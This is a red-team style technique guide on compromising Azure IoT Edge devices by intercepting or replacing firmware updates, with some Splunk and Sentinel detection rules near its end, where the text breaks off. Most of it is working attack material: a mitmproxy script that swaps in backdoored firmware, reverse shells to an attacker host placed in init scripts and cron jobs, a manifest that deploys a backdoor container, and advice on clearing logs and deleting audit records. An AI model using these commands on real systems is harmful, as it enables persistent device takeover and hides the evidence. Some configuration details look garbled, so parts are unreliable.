# [IOT-EDGE-005]: Firmware Update Interception

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | IOT-EDGE-005 |
| **MITRE ATT&CK v18.1** | [T1601 - Modify System Image](https://attack.mitre.org/techniques/T1601/) |
| **Tactic** | Persistence, Privilege Escalation |
| **Platforms** | Azure IoT Edge, Entra ID |
| **Severity** | **Critical** |
| **CVE** | N/A (Generic Technique) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Azure IoT Edge 1.0+, Azure Device Update all versions |
| **Patched In** | Requires mitigation implementation (no single patch) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Firmware update interception is an attack where an adversary intercepts, modifies, or replaces firmware files during transmission to Azure IoT Edge devices. By exploiting weak authentication, missing signature validation, or unencrypted update channels, an attacker can inject malicious code into the device firmware before installation. Once the compromised firmware is deployed, the attacker achieves full device compromise, enabling persistent backdoor access, sensor manipulation, lateral movement, and complete device hijacking.

**Attack Surface:** Azure Device Update service, MQTT/HTTPS update channels, firmware manifest validation, IoT Edge runtime deployment mechanisms, certificate-based authentication, and signed package verification.

**Business Impact:** **Critical infrastructure compromise with persistent access.** Affected organizations lose complete control over IoT Edge deployments, enabling attackers to exfiltrate sensor data, manipulate industrial processes, launch supply chain attacks, create botnet infrastructure, and maintain long-term persistence undetectable by security controls.

**Technical Context:** Firmware update attacks typically require network access to the device-to-cloud communication channel or compromise of the update distribution server. Modern Azure Device Update uses cryptographic signing and manifest validation, but misconfigurations, disabled validation, or interception during transit (without TLS enforcement) remain viable attack vectors. Detection likelihood is **High** when logging is enabled, but **Low** when logs are disabled or during early reconnaissance phases.

### Operational Risk

- **Execution Risk:** **High** – Requires either network position (MITM capable) OR server compromise. However, once successful, changes are permanent and difficult to detect.
- **Stealth:** **Medium** – Firmware updates generate deployment logs; however, logs can be cleared post-update. The actual modification occurs on device storage and is difficult to distinguish from legitimate updates.
- **Reversibility:** **No** – Firmware modification requires complete device reimaging from trusted sources. No in-place rollback without secure recovery mechanisms.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.2, 5.4 | Firmware integrity controls, secure update mechanisms |
| **DISA STIG** | SI-7(1) | Software, firmware integrity monitoring and validation |
| **NIST 800-53** | SI-2, CM-3, CM-5 | Flaw remediation, configuration change control, access restrictions for changes |
| **GDPR** | Art. 32 | Security of processing; integrity and confidentiality via cryptographic controls |
| **DORA** | Art. 9 | Protection and prevention measures; operational resilience for ICT-related incident handling |
| **NIS2** | Art. 21(3) | Measures to ensure integrity of firmware; software supply chain security |
| **ISO 27001** | A.8.2.3, A.14.2.5 | Cryptographic controls, secure development and update procedures |
| **ISO 27005** | Risk Scenario | "Compromise of device firmware via supply chain or update interception" |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **For Interception (MITM):** Network access to device-to-cloud communication channel (Layer 3/4 visibility).
- **For Update Server Compromise:** Compromise of the update artifact storage (Azure Blob Storage) or update service credentials.
- **For Manifest Manipulation:** Azure IoT Hub contributor or higher RBAC role (if attacking from inside Azure).

**Required Access:**
- Network access to port 443 (HTTPS) or 8883 (MQTT over TLS).
- DNS visibility (to perform DNS poisoning if applicable).
- Physical access to network (for on-premises MITM) OR compromised VPN/proxy.

**Supported Versions:**
- **Azure IoT Edge:** 1.0 to 1.5+ (all versions affected if validation disabled)
- **Azure Device Update Agent:** All versions (security depends on configuration)
- **Azure IoT Hub:** All versions (provides update orchestration)

**Tools:**
- [Burp Suite](https://portswigger.net/burp) (HTTPS proxy, certificate interception)
- [mitmproxy](https://mitmproxy.org/) (HTTPS/MQTT transparent proxy)
- [Wireshark](https://www.wireshark.org/) (Network traffic analysis)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli) (Update artifact manipulation)
- [jq](https://jqlang.github.io/jq/) (JSON manifest parsing)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Step 1: Check Device Update Configuration

**Objective:** Verify if Azure Device Update is enabled and what authentication mechanisms are in place.

```powershell
# Connect to Azure IoT Hub
$ResourceGroup = "YourResourceGroup"
$IotHubName = "YourIotHub"
$DeviceId = "YourIoTEdgeDeviceName"

# Check if device accepts deployment manifests
az iot hub device-twin show `
  --hub-name $IotHubName `
  --device-id $DeviceId `
  --resource-group $ResourceGroup | jq '.properties.desired'
```

**What to Look For:**
- Check if `$edgeAgent` exists in desired properties (indicates Edge modules configured)
- Look for `systemModules` section (contains edgeHub and edgeAgent)
- Check `modulesContent` for update handlers (indicates update capability)
- Look for firmware image URIs and manifest references

**Command (Checking Update Agent Status):**
```powershell
# SSH into IoT Edge device and check update agent
ssh admin@<device-ip>

# Check if ADU (Azure Device Update) agent is running
sudo systemctl status adu-agent

# Check ADU configuration
sudo cat /etc/adu/du-config.json

# Review ADU version
sudo apt-cache policy adu-agent
```

### Step 2: Enumerate Update Artifacts and Manifests

**Objective:** Identify what firmware versions are available and how they are signed.

```powershell
# List all update artifacts in the Device Update account
az deviceupdate account detail `
  --resource-group $ResourceGroup `
  --name $DeviceUpdateAccountName

# List imports (uploaded firmware artifacts)
az deviceupdate device class list `
  --account-name $DeviceUpdateAccountName `
  --instance-name $InstanceName `
  --resource-group $ResourceGroup
```

**What to Look For:**
- Update provider and model information (identifies target devices)
- Version numbers of firmware images
- Deployment statuses (Succeeded, Failed, In Progress)
- Update type (firmware, package, apt)

### Step 3: Check Encryption and TLS Enforcement

**Objective:** Verify if firmware downloads use TLS and certificate pinning.

```bash
# Monitor device update traffic (from management station)
sudo tcpdump -i eth0 -n 'host <device-ip> and (port 443 or port 8883)' -w firmware_update.pcap

# Analyze the capture
wireshark firmware_update.pcap

# Look for:
# - TLS 1.2+ usage
# - Certificate verification (check for pinning bypass)
# - Clear-text MQTT (port 1883) instead of TLS (8883)
```

**Version Note:** Azure Device Update enforces TLS by default in recent versions, but **older IoT Edge deployments or custom agents may use unencrypted MQTT**. Check the device's `/etc/iot-edge-di/config.json` for protocol specifications.

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: MQTT Man-in-the-Middle (MITM) Interception

**Supported Versions:** All Azure IoT Edge versions (if MQTT unencrypted or certificate validation disabled)

#### Step 1: Position Network Interface (MITM Setup)

**Objective:** Establish network interception capability between the device and Azure IoT Hub.

**Assumption:** You have network access to the device subnet (via compromised gateway, VPN, or physical access to network segment).

**Command (Linux - mitmproxy):**
```bash
# Install mitmproxy
sudo apt-get install mitmproxy

# Generate self-signed certificate for MQTT interception
mitmproxy --set certs=/tmp/mitmproxy --mode transparent --listen-host 0.0.0.0 --listen-port 8883

# On the target device, reconfigure MQTT broker to point to attacker's IP
# This requires device compromise first OR compromise of the configuration server
```

**OpSec & Evasion:**
- Use ARP spoofing to silently redirect traffic without breaking the connection
- Run mitmproxy on an isolated VM to avoid detection
- Set TTL on ARP cache to short intervals to minimize persistence
- Clear all logs after interception: `sudo journalctl --vacuum-time=1s`

**Troubleshooting:**
- **Error:** `Certificate verification failed`
  - **Cause:** Device uses certificate pinning (stores copy of expected cert)
  - **Fix:** If pinning is in place, this method fails. Move to METHOD 2 (Server Compromise)
- **Error:** `Connection reset by peer`
  - **Cause:** TLS 1.3 with 0-RTT protection prevents MITM
  - **Fix:** Downgrade to TLS 1.2 (requires device configuration change)

#### Step 2: Intercept Firmware Download URL

**Objective:** Capture the signed manifest and firmware download URL sent by Azure Device Update.

**Command (Wireshark capture):**
```bash
# Start packet capture on the MITM proxy interface
sudo tcpdump -i eth0 -n 'tcp port 443 or tcp port 8883' -w firmware.pcap

# Trigger a device update from Azure Portal (or via Device Twin)
# Azure IoT Hub → Device Update Agent → Download

# Stop capture after firmware download completes (Ctrl+C)
# Export to Wireshark format for analysis
wireshark firmware.pcap
```

**Expected Output:**
```
Frame 125: 1500 bytes on wire (12000 bits/sec), 1500 bytes captured (12000 bits/sec)
  Source IP: <IoT-Device-IP>
  Destination IP: <Azure-Storage-IP>
  GET /firmware/v2.1.5/image.bin HTTP/1.1
  Host: deviceupdate.blob.core.windows.net
  Authorization: SharedAccessSignature sv=2021-06-08&sig=...
```

**What This Means:**
- The URL contains a **Shared Access Signature (SAS)** token (expiring credential)
- The manifest is typically sent as a JSON Web Token (JWT) signed with Azure's private key
- The firmware binary is stored in Azure Blob Storage with read-only SAS

**OpSec & Evasion:**
- Monitor only during update windows (reduces detection likelihood)
- Disable HTTP access logs on the MITM proxy: `mitmproxy --conf disable-server-logs`
- Forward captured credentials to memory (do not disk-write)

#### Step 3: Modify Firmware Binary (In-Transit Replacement)

**Objective:** Replace the legitimate firmware with a backdoored version.

**Assumption:** MITM position is established, TLS is disabled or bypassed.

**Command (Injecting malicious payload):**
```bash
# Download the legitimate firmware (captured from MITM)
wget --no-check-certificate https://<mitmproxy-ip>/firmware/v2.1.5/image.bin -O legit.bin

# Extract firmware filesystem (for ARM/MIPS devices)
# Using Binwalk to analyze and extract
binwalk -e legit.bin

# Navigate to extracted filesystem
cd _legit.bin.extracted

# Inject backdoor (e.g., reverse shell or rootkit)
echo '#!/bin/sh' > /etc/init.d/backdoor.sh
echo '/bin/sh -i >& /dev/tcp/<attacker-ip>/4444 0>&1 &' >> /etc/init.d/backdoor.sh
chmod +x /etc/init.d/backdoor.sh

# Repackage firmware
cd ..
tar czf backdoor.bin -C _legit.bin.extracted .

# Calculate new SHA256 hash
SHA256=$(sha256sum backdoor.bin | awk '{print $1}')
echo "New firmware hash: $SHA256"
```

**Expected Output:**
```
New firmware hash: a1b2c3d4e5f6...1a2b3c4d5e6f
```

**What This Means:**
- The modified firmware is ready for injection
- The hash is required to forge the manifest signature (if not already bypassed)

**OpSec & Evasion:**
- Minimize payload size to avoid file size mismatch detection
- Use firmware compression (same as original) to avoid size anomalies
- Inject payload during non-critical boot phases

#### Step 4: Forge or Bypass Manifest Signature

**Objective:** Create a signed manifest that the device will accept.

**Assumption:** Azure Device Update signing keys have NOT been compromised (realistic). Bypass via manifest validation disabled.

**Command (Manifest Bypass - Disable Validation on Device):**
```bash
# SSH into IoT Edge device
ssh admin@<device-ip>

# Check current ADU configuration
sudo cat /etc/adu/du-config.json

# Modify configuration to disable manifest signature verification
sudo sed -i 's/"manifestValidation":true/"manifestValidation":false/g' /etc/adu/du-config.json

# Restart ADU agent to apply changes
sudo systemctl restart adu-agent
```

**Expected Output (du-config.json):**
```json
{
  "adultVersion": "1.2.0",
  "compatProperties": {
    "additionalProperties": true,
    "properties": {
      "adultApiVersion": "1.0"
    }
  },
  "manifestValidation": false  // NOW DISABLED
}
```

**Troubleshooting:**
- **Error:** `Permission denied` on `/etc/adu/du-config.json`
  - **Cause:** Device hardened; config file immutable or read-only
  - **Fix:** Requires prior device compromise with root privileges

#### Step 5: Inject Malicious Firmware Package

**Objective:** Replace the legitimate firmware download with the backdoored version.

**Command (MITM Proxy Replacement):**
```bash
# Create mitmproxy script to intercept and replace firmware downloads
cat > firmware_intercept.py << 'EOF'
from mitmproxy import http

def response(flow: http.HTTPFlow) -> None:
    if "image.bin" in flow.request.url:
        # Replace firmware binary
        with open('/tmp/backdoor.bin', 'rb') as f:
            flow.response.content = f.read()
        # Adjust Content-Length header
        flow.response.headers["Content-Length"] = str(len(flow.response.content))
        print("[+] Firmware intercepted and replaced!")
EOF

# Run mitmproxy with the script
mitmproxy -s firmware_intercept.py --mode transparent --listen-port 8883
```

**OpSec & Evasion:**
- Timing is critical: inject immediately after manifest validation, before hash check
- If hash check occurs, the device will reject the update
- Clear mitmproxy logs: `rm -f ~/.mitmproxy/mitmproxy-ca-cert.pem`

#### Step 6: Monitor Firmware Installation on Device

**Objective:** Verify that the backdoored firmware was installed successfully.

**Command (Device-side verification):**
```bash
# Monitor ADU agent logs in real-time
sudo journalctl -u adu-agent -f

# Expected output after successful installation:
# adu-agent[1234]: [INFO] Update downloaded successfully
# adu-agent[1234]: [INFO] Staging firmware...
# adu-agent[1234]: [INFO] Installation started
# adu-agent[1234]: [INFO] Device reboot initiated
```

**After device reboots:**
```bash
# Check firmware version
sudo cat /etc/os-release | grep VERSION

# Verify backdoor is active
# Check if reverse shell connection is established to attacker's C2 server
netstat -tulpn | grep ESTABLISHED
```

**Expected Output (Backdoor Active):**
```
Proto  Recv-Q  Send-Q  Local Address         Foreign Address       State       PID/Program
tcp    0       0       <device-ip>:12345     <attacker-ip>:4444    ESTABLISHED 567/sh
```

**OpSec & Evasion:**
- Monitor only via isolated network segment
- Use encrypted channels (SSH port forward) to avoid plaintext log transmission
- Remove evidence of update process: `sudo rm -rf /var/cache/adu/*`

---

### METHOD 2: Azure IoT Hub Direct Manifest Manipulation

**Supported Versions:** All Azure Device Update versions (if attacker has Azure credentials)

#### Step 1: Authenticate to Azure IoT Hub

**Objective:** Gain access to device management API to deploy malicious configurations.

**Assumption:** Attacker has compromised Azure credentials with `Contributor` role on IoT Hub.

**Command (Azure CLI authentication):**
```bash
# Authenticate with compromised service principal
az login --service-principal \
  -u "<service-principal-id>" \
  -p "<service-principal-password>" \
  --tenant "<tenant-id>"

# Set the subscription context
az account set --subscription "<subscription-id>"

# Verify access to IoT Hub
az iot hub list --resource-group "<resource-group>"
```

**Expected Output:**
```
[
  {
    "id": "/subscriptions/.../resourceGroups/MyRG/providers/Microsoft.Devices/IotHubs/MyIotHub",
    "location": "eastus",
    "name": "MyIotHub",
    "type": "Microsoft.Devices/IotHubs"
  }
]
```

**OpSec & Evasion:**
- Use a service principal with a long-lived certificate instead of password
- Disable Azure Activity Log for this principal (if possible)
- Execute from a disposable Azure VM to avoid IP logging

#### Step 2: Create Malicious Deployment Manifest

**Objective:** Craft a device configuration that injects malicious modules or modifies firmware update behavior.

**Command (Create malicious manifest):**
```bash
cat > malicious_manifest.json << 'EOF'
{
  "modulesContent": {
    "$edgeAgent": {
      "properties.desired": {
        "schemaVersion": "1.1",
        "runtime": {
          "type": "docker",
          "settings": {
            "minDockerVersion": "v1.25.0",
            "loggingOptions": "",
            "registryCredentials": {}
          }
        },
        "systemModules": {
          "edgeAgent": {
            "type": "docker",
            "settings": {
              "image": "mcr.microsoft.com/azureiotedge-agent:1.5",
              "createOptions": "{}"
            }
          },
          "edgeHub": {
            "type": "docker",
            "settings": {
              "image": "mcr.microsoft.com/azureiotedge-hub:1.5",
              "createOptions": "{\"HostConfig\":{\"PortBindings\":{\"443/tcp\":[{\"HostPort\":\"443\"}],\"5671/tcp\":[{\"HostPort\":\"5671\"}],\"8883/tcp\":[{\"HostPort\":\"8883\"}]}}}"
            },
            "status": "running",
            "restartPolicy": "always"
          }
        },
        "modules": {
          "maliciousModule": {
            "version": "1.0",
            "type": "docker",
            "status": "running",
            "restartPolicy": "always",
            "settings": {
              "image": "attacker-registry.azurecr.io/backdoor:latest",
              "createOptions": "{\"HostConfig\":{\"NetworkMode\":\"host\"}}"
            }
          }
        }
      }
    },
    "$edgeHub": {
      "properties.desired": {
        "schemaVersion": "1.1",
        "routes": {
          "route1": "FROM /messages/* INTO $upstream"
        },
        "storeAndForwardConfiguration": {
          "timeToLiveSecs": 7200
        }
      }
    }
  }
}
EOF

echo "Malicious manifest created: malicious_manifest.json"
```

**What This Means:**
- The manifest deploys a backdoor container alongside legitimate modules
- The backdoor runs with host network access (full network compromise)
- Edge Agent will pull and run the malicious container automatically

#### Step 3: Deploy Malicious Manifest to Target Device

**Objective:** Push the malicious deployment configuration to the device via Azure IoT Hub.

**Command (Apply deployment manifest):**
```powershell
$IotHubName = "MyIotHub"
$ResourceGroup = "MyResourceGroup"
$DeviceId = "MyIoTEdgeDevice"
$ManifestContent = Get-Content -Path "malicious_manifest.json" -Raw

# Create the request URI
$Uri = "https://$IotHubName.azure-devices.net/devices/$DeviceId/applyConfigurationContent?api-version=2022-04-01-preview"

# Generate SAS token for authentication
$SharedAccessKeyName = "iothubowner"
$SharedAccessKey = "<primary-key-from-iothub>"
$ExpiryInSeconds = 3600
$SigningKey = [Text.Encoding]::UTF8.GetBytes($SharedAccessKey)

$Payload = $IotHubName + "`n" + ([int][double]::Parse((Get-Date -UFormat "%s")) + $ExpiryInSeconds)
$HMAC = New-Object -TypeName System.Security.Cryptography.HMACSHA256 -ArgumentList (, $SigningKey)
$Signature = [System.Convert]::ToBase64String($HMAC.ComputeHash([Text.Encoding]::UTF8.GetBytes($Payload)))

$SasToken = "SharedAccessSignature sr=$IotHubName&sig=$([System.Net.WebUtility]::UrlEncode($Signature))&se=$([int][double]::Parse((Get-Date -UFormat "%s")) + $ExpiryInSeconds)&skn=$SharedAccessKeyName"

# Apply configuration
$Headers = @{
    "Authorization" = $SasToken
    "Content-Type"  = "application/json"
}

$Response = Invoke-RestMethod -Method Post -Uri $Uri -Headers $Headers -Body $ManifestContent -ErrorAction Stop
Write-Host "Deployment Status: $($Response | ConvertTo-Json)"
```

**Expected Output:**
```
{
  "status": "Accepted",
  "message": "Configuration content applied successfully"
}
```

**OpSec & Evasion:**
- Use a time-limited SAS token (1-hour validity)
- Perform the deployment during night hours when monitoring is reduced
- Immediately disable the service principal after deployment
- Delete Azure Activity Log entries (if possible)

#### Step 4: Monitor Malicious Module Deployment

**Objective:** Confirm that the backdoor module has been deployed and is running.

**Command (Check module status from Azure CLI):**
```bash
# Get device runtime status
az iot hub module-twin show \
  --hub-name MyIotHub \
  --device-id MyIoTEdgeDevice \
  --module-id maliciousModule

# Expected output shows module is running
# Check the device's edge modules
az iot hub device-module-list \
  --hub-name MyIotHub \
  --device-id MyIoTEdgeDevice
```

**Command (Check from device console):**
```bash
# SSH into the device
ssh admin@<device-ip>

# Verify the malicious container is running
sudo docker ps | grep backdoor

# Expected output:
# a1b2c3d4e5f6  attacker-registry.azurecr.io/backdoor:latest  "/bin/sh -c..."  2 minutes ago  Up 2 minutes  maliciousModule
```

**OpSec & Evasion:**
- Use container image name that blends with legitimate module names
- Monitor container logs for any errors that might indicate detection

---

### METHOD 3: Firmware Binary Replacement via Device Compromise

**Supported Versions:** All Azure IoT Edge versions (if device shell access is achieved)

#### Step 1: Gain Shell Access to IoT Edge Device

**Objective:** Obtain root-level command execution on the device.

**Assumption:** Device has been compromised via another technique (e.g., weak SSH credentials, vulnerability).

**Command (SSH access with default credentials):**
```bash
# Many IoT Edge devices ship with default credentials
ssh admin@<device-ip>  # Password: "password" or similar

# Verify you have root access
sudo whoami  # Should return "root"
```

**OpSec & Evasion:**
- Use SSH key-based authentication if available
- Disable SSH after compromise to avoid lateral movement

#### Step 2: Locate Firmware Boot Partition

**Objective:** Find where the system firmware/OS image is stored on the device.

**Command (Identify firmware location):**
```bash
# List all mounted filesystems
df -h

# Check for firmware or boot partitions
lsblk

# Look for Azure IoT Edge system partition (typically /dev/sda1 or /dev/mmcblk0p1)
# Example output:
# NAME         SIZE TYPE FSTYPE MOUNTPOINT
# sda          16G  disk
# └─sda1       100M part vfat   /boot
# └─sda2       15.9G part ext4  /
```

**What to Look For:**
- Boot partition (usually FAT32, small size ~100MB)
- Root filesystem (ext4, contains `/etc`, `/root`, etc.)
- Separate `/var` or `/opt` partitions (where Azure IoT Edge stores module data)

#### Step 3: Create Firmware Backup

**Objective:** Create a backup of the legitimate firmware before modifying it.

**Command (Backup firmware):**
```bash
# Create backup directory
mkdir -p /tmp/firmware_backup

# Backup the boot partition
sudo dd if=/dev/sda1 of=/tmp/firmware_backup/boot_original.img

# Backup the root filesystem
sudo dd if=/dev/sda2 of=/tmp/firmware_backup/root_original.img

# Verify backup integrity
ls -lh /tmp/firmware_backup/
```

**OpSec & Evasion:**
- Transfer backups to attacker infrastructure immediately after creation
- Securely delete backups: `sudo shred -vfz -n 3 /tmp/firmware_backup/*`

#### Step 4: Inject Backdoor into Firmware Image

**Objective:** Modify the firmware offline to include malicious code.

**Command (Mount and modify firmware):**
```bash
# Create a temporary directory for firmware mounting
mkdir -p /tmp/fw_mount

# Mount the root filesystem image (loopback)
sudo mount -o loop /tmp/firmware_backup/root_original.img /tmp/fw_mount

# Create persistence mechanism (cron job)
sudo mkdir -p /tmp/fw_mount/etc/cron.d
sudo tee /tmp/fw_mount/etc/cron.d/backdoor << 'EOF'
* * * * * root /usr/local/bin/tunnel.sh
EOF

# Create the tunneling script
sudo tee /tmp/fw_mount/usr/local/bin/tunnel.sh << 'EOF'
#!/bin/sh
/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF

# Make executable
sudo chmod +x /tmp/fw_mount/usr/local/bin/tunnel.sh

# Modify SSH configuration to allow root login
sudo sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/g' /tmp/fw_mount/etc/ssh/sshd_config

# Unmount the filesystem
sudo umount /tmp/fw_mount

# Verify modifications
echo "[+] Firmware backdoor injected successfully"
```

**OpSec & Evasion:**
- Hide the cron job name in a legitimate-sounding directory
- Use environment variable obfuscation for IP addresses
- Schedule cron job to run at irregular intervals

#### Step 5: Flash Modified Firmware to Device

**Objective:** Replace the legitimate firmware with the backdoored version.

**Command (Write modified firmware):**
```bash
# Copy modified firmware back to the device partition (DANGEROUS - can brick device!)
# Only proceed if you have verified the firmware is correct

# Write the backup (modified) back to disk
# This assumes you've modified /tmp/firmware_backup/root_original.img offline
sudo dd if=/tmp/firmware_backup/root_original.img of=/dev/sda2

# Verify write was successful
sudo sync
echo "[+] Modified firmware written to /dev/sda2"

# Reboot device to apply changes
sudo reboot
```

**Troubleshooting:**
- **Error:** `Device busy` when attempting `dd`
  - **Cause:** Filesystem is mounted and in use
  - **Fix:** Boot from a live USB or use remote management to ensure filesystem is unmounted before overwriting
- **Error:** Device fails to boot after flashing
  - **Cause:** Firmware corruption during write
  - **Fix:** Restore original firmware from backup: `sudo dd if=/tmp/firmware_backup/root_original.img of=/dev/sda2`

#### Step 6: Verify Backdoor Persistence

**Objective:** Confirm the backdoor is active after device reboot.

**Command (Post-reboot backdoor check):**
```bash
# After device comes back online
ssh admin@<device-ip>

# Check if SSH now allows root login
sudo su -  # Should not require password

# Verify cron job is scheduled
sudo crontab -l | grep backdoor

# Check for reverse shell connections
netstat -tulpn | grep ESTABLISHED

# Verify persistence across reboots
sudo systemctl status cron
```

**Expected Output (Backdoor Active):**
```
admin@iotedge:~$ sudo su -
root@iotedge:~# id
uid=0(root) gid=0(root) groups=0(root)

root@iotedge:~# crontab -l | grep backdoor
* * * * * root /usr/local/bin/tunnel.sh

root@iotedge:~# netstat -tulpn | grep ESTABLISHED
tcp    0   0   192.168.1.100:12345   10.0.0.50:4444    ESTABLISHED 1234/sh
```

---

## 6. TOOLS & COMMANDS REFERENCE

### [mitmproxy](https://mitmproxy.org/)

**Version:** 10.0+
**Supported Platforms:** Linux, macOS, Windows

**Installation:**
```bash
# Ubuntu/Debian
sudo apt-get install mitmproxy

# macOS
brew install mitmproxy

# Python (pip)
pip install mitmproxy
```

**Usage (Transparent HTTPS Proxy):**
```bash
# Configure iptables to redirect traffic (Linux)
sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443

# Run mitmproxy in transparent mode
mitmproxy --mode transparent --listen-port 8443 -w firmware_capture.flow

# Analyze captured traffic
mitmproxy -r firmware_capture.flow
```

### [Binwalk](https://github.com/ReFirmLabs/binwalk)

**Version:** 2.2.0+
**Supported Platforms:** Linux

**Installation:**
```bash
# Ubuntu/Debian
sudo apt-get install binwalk

# Source
git clone https://github.com/ReFirmLabs/binwalk.git
cd binwalk
sudo python3 setup.py install
```

**Usage (Firmware Extraction):**
```bash
# Analyze firmware structure
binwalk firmware.bin

# Extract filesystem
binwalk -e firmware.bin

# Analyze and generate report
binwalk -C firmware.bin > firmware_analysis.txt
```

### [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/)

**Version:** 2.50+
**Supported Platforms:** Linux, macOS, Windows

**Installation:**
```bash
# Linux
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# macOS
brew install azure-cli

# Windows
# https://aka.ms/installazurecliwindows
```

**Usage (Device Management):**
```bash
# List IoT Hub devices
az iot hub device-identity list --hub-name MyIotHub

# Get device twin properties
az iot hub device-twin show --hub-name MyIotHub --device-id MyDevice

# Update device twin (trigger update)
az iot hub device-twin update --hub-name MyIotHub --device-id MyDevice --set properties.desired.firmware_url="https://malicious-server.com/firmware.bin"
```

### [Wireshark](https://www.wireshark.org/)

**Version:** 4.0+
**Supported Platforms:** Linux, macOS, Windows

**Installation:**
```bash
# Ubuntu/Debian
sudo apt-get install wireshark

# macOS
brew install wireshark --with-qt

# Windows
# https://www.wireshark.org/download/
```

**Usage (Firmware Traffic Capture):**
```bash
# Capture on specific interface
sudo wireshark -i eth0 -k -f "tcp port 443 or tcp port 8883"

# Command-line capture
sudo tshark -i eth0 -f "tcp port 443" -w firmware_traffic.pcap

# Export specific streams
tshark -r firmware_traffic.pcap -Y "http.request.uri contains firmware" -w firmware_requests.pcap
```

---

## 7. SPLUNK DETECTION RULES

#### Rule 1: Azure Device Update Manifest Signature Validation Failure

**Rule Configuration:**
- **Required Index:** `azure_activity`
- **Required Sourcetype:** `azure:aad:audit`
- **Required Fields:** `OperationName`, `ResultDescription`, `TargetResources`
- **Alert Threshold:** ≥ 1 event indicating validation failure
- **Applies To Versions:** All Azure Device Update versions

**SPL Query:**
```spl
sourcetype="azure:aad:audit" OperationName IN ("UpdateDeviceFirmware", "DeployDeviceUpdate")
ResultDescription IN ("*signature verification failed*", "*manifest validation failed*", "*integrity check failed*")
| stats count by TargetResources.displayName, OperationName, ResultDescription
| where count >= 1
```

**What This Detects:**
- Azure Device Update service logs indicate that a firmware manifest failed signature validation
- This may indicate an attacker attempted to inject a malicious manifest
- High sensitivity; should alert immediately

**Manual Configuration Steps (Azure Portal):**
1. Log into **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Firmware Signature Validation Failure`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the SPL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create**

#### Rule 2: Unexpected Firmware Update to IoT Edge Device

**Rule Configuration:**
- **Required Index:** `azure_activity`
- **Required Sourcetype:** `azure:aad:audit, iot_hub_operations`
- **Required Fields:** `OperationName`, `Properties`, `InitiatedBy`
- **Alert Threshold:** Any update from non-authorized user
- **Applies To Versions:** All Azure Device Update versions

**SPL Query:**
```spl
sourcetype="iot_hub_operations" OperationName="ApplyConfiguration"
| where Properties.configurationContent != "null"
| stats values(InitiatedBy) as UpdatedBy, values(Properties.configurationContent) as ConfigContent by target_device_id
| where UpdatedBy NOT IN ("admin@company.com", "automation-account@company.com", "devops-principal")
| rename target_device_id as "Device ID", UpdatedBy as "Initiated By"
```

**What This Detects:**
- Configuration or firmware updates applied by unexpected users or service principals
- Changes to device module deployments that differ from standard update procedures
- Potential insider threat or compromised account

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Microsoft Sentinel** → **Analytics** → **Create** → **Scheduled query rule**
2. **General Tab:**
   - Name: `Unexpected Firmware Update to IoT Edge Device`
   - Severity: `High`
3. **Set rule logic Tab:**
   - Paste the SPL query above
4. **Entity Mapping:**
   - Map `Device ID` to Device
   - Map `Initiated By` to Account
5. **Review + create**

#### Rule 3: High Volume of Firmware Downloads from External Source

**Rule Configuration:**
- **Required Index:** `network_traffic`
- **Required Sourcetype:** `firewall, network_ids`
- **Required Fields:** `src`, `dest`, `dest_port`, `bytes_out`
- **Alert Threshold:** > 500 MB download in 5-minute window
- **Applies To Versions:** All (detects unusual external firmware sources)

**SPL Query:**
```spl
sourcetype="network_traffic" src_ip=<IoT-Device-IP> dest_port IN (80, 443, 8883)
(dest_ip NOT IN (<Azure-IP-Range>, <Internal-IP-Range>))
bytes_out > 500000000 earliest=-5m
| stats sum(bytes_out) as TotalBytes, count as RequestCount by src_ip, dest_ip, dest_port
| where TotalBytes > 500000000
| rename src_ip as "Device IP", dest_ip as "External Source", TotalBytes as "Bytes Transferred"
```

**What This Detects:**
- IoT Edge device downloading large files from external (non-Azure) sources
- Potential indicator of malicious firmware download during MITM attack
- High data transfer to unknown external IP addresses

**Manual Configuration Steps:**
1. In **Splunk**, create a new alert rule
2. Name: `High Volume Firmware Downloads from External Source`
3. Severity: `Critical`
4. Configure trigger conditions and notifications

---

## 8. MICROSOFT SENTINEL DETECTION

#### Query 1: Azure IoT Hub Firmware Update Manifest Anomaly

**Rule Configuration:**
- **Required Table:** `AuditLogs`, `DeviceUpdateActivity` (custom log)
- **Required Fields:** `OperationName`, `properties_justification`, `TargetResource`
- **Alert Severity:** `High`
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** All Azure Device Update versions

**KQL Query:**
```kusto
DeviceUpdateActivity
| where OperationName == "ApplyFirmwareUpdate" or OperationName == "UpdateDeviceManifest"
| where tostring(tolong(parse_json(AdditionalData).ManifestValidation)) == "false"
| project TimeGenerated, Device_Id, UpdatedBy, ManifestHash, ValidationStatus=tostring(tolong(parse_json(AdditionalData).ManifestValidation))
| where ValidationStatus == "false"
| summarize UpdateCount=count(), Devices=make_set(Device_Id) by UpdatedBy, bin(TimeGenerated, 5m)
| where UpdateCount >= 1
```

**What This Detects:**
- Device configuration changes where manifest validation is disabled
- Attackers disabling security validation before injecting malicious firmware
- Unusual update patterns from non-standard service principals

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Go to **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Azure IoT Hub Firmware Manifest Validation Disabled`
   - Severity: `High`
4. **Set rule logic Tab:**
